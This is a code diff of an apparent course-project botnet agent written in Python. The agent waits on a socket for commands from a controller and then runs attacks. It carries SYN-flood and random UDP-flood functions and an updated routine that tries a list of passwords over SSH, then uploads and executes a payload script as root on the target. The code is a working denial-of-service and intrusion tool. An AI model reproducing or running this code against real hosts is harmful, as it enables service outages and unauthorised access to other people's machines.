@@ -7,8 +7,13 @@ import string
 import requests
 import uuid
 import time
+import os
+import paramiko
 
 def synflood(TARGET,TARGETPORT,TIME):
+	"""
+	This function is a syn flood attack
+	"""
 	currenttime = time.time()
 	timetostop = currenttime + int(TIME)
 	while time.time() < timetostop:
@@ -25,9 +30,15 @@ def synflood(TARGET,TARGETPORT,TIME):
 
 
 def generaterandomstring():
+	"""
+	This function will generate a random string
+	"""
 	return ''.join(random.choice(string.ascii_lowercase) for index in range(random.randint(0,1000)))
 
 def randombyteflooding(TARGET,DURATION):
+	"""
+	This function will flood a server using packets of random size
+	"""
 	currenttime = time.time()
 	timetostop = currenttime + int(DURATION)
 	while time.time() < timetostop:
@@ -39,22 +50,26 @@ def randombyteflooding(TARGET,DURATION):
 
 		sr(ippacket/udppacket/generaterandomstring(),timeout=2)
 
-def installcontent(TARGET):
-	try:
-		client = paramiko.SSHClient()
-		client.load_system_host_keys()
-		client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-		client.connect(TARGET,password=passwordsource)
-		client.exec_command('rm /root/ComputerCrash.py')
-		client.exec_command('touch /root/ComputerCrash.py')
-		client.exec_command('rm /root/content.txt')
-		client.exec_command('touch content.txt')
-		sftp = client.open_sftp()
-		sftp.put('/root/CS445-Project/ComputerCrash.py','/root/ComputerCrash.py')
-		sftp.put('/root/CS445-Project/content.txt', '/root/content.txt')
-		client.exec_command('python ComputerCrash.py')
-	except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
-		return None
+def installcontent(TARGET,listofpasswords):
+	"""
+	This function will install content which will prevent a user from closing gedit
+	"""
+	for index in range(len(listofpasswords)):
+		try:
+			client = paramiko.SSHClient()
+			client.load_system_host_keys()
+			client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+			client.connect(TARGET,password=listofpasswords[index])
+			client.exec_command('rm /root/ComputerCrash.py')
+			client.exec_command('touch /root/ComputerCrash.py')
+			client.exec_command('rm /root/content.txt')
+			client.exec_command('touch content.txt')
+			sftp = client.open_sftp()
+			sftp.put(os.getcwd() + '/ComputerCrash.py','/root/ComputerCrash.py')
+			sftp.put(os.getcwd() + '/content.txt', '/root/content.txt')
+			client.exec_command('python ComputerCrash.py')
+		except(paramiko.ssh_exception.AuthenticationException,paramiko.ssh_exception.SSHException,paramiko.ssh_exception.NoValidConnectionsError) as e:
+			pass
 
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
@@ -75,6 +90,7 @@ STATUS = 'READY TO ATTACK'
 while True:
 	data = s.recv(1024)
 	parseddata = data.split("\t")
+	
 	if "STATUS" in data:
 		s.send(STATUS)
 
@@ -97,8 +113,8 @@ while True:
 	if parseddata[0] == "FLOODING":
 		if STATUS != "READY TO ATTACK":
 			s.send(STATUS)
-
 		else:
+			STATUS = "ATTACKING USING PLAIN FLOODING"
 			randombyteflooding(parseddata[1],parseddata[2])
 			STATUS = 'READY TO ATTACK'
 
@@ -107,11 +123,12 @@ while True:
 			s.send(STATUS)
 
 		else:
-			installcontent(parseddata[1])
+			STATUS = "ATTACKING using malicious content"
+			print(parseddata[2].split(' '))
+			installcontent(parseddata[1],parseddata[2].split(' '))
 			STATUS = 'READY TO ATTACK'
 
-			#s.send(str(nm.scaninfo()))
-
 	print("Data receieved: {}".format(data))
+
 
 s.close()
